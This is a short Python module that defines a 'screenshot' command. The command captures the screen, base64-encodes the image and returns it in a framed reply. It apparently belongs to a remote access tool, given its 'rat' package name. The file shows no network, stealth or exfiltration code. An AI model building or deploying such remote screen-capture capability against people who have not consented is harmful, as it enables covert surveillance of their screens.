from rat.commands.base_command import BaseCommand
from rat.client.screenshot_service import ScreenshotService
import base64


class ScreenshotCommand(BaseCommand):

    name = "screenshot"
    description = "Capture the screen"

    _service = ScreenshotService()

    def execute(self, args: str) -> str:

        try:

            image_bytes = self._service.capture()

            encoded = base64.b64encode(image_bytes).decode()

            return "SCREENSHOT\n" "OK\n" f"{encoded}\n" "EOF"

        except Exception as e:

            return "SCREENSHOT\n" "ERROR\n" f"{e}\n" "EOF"
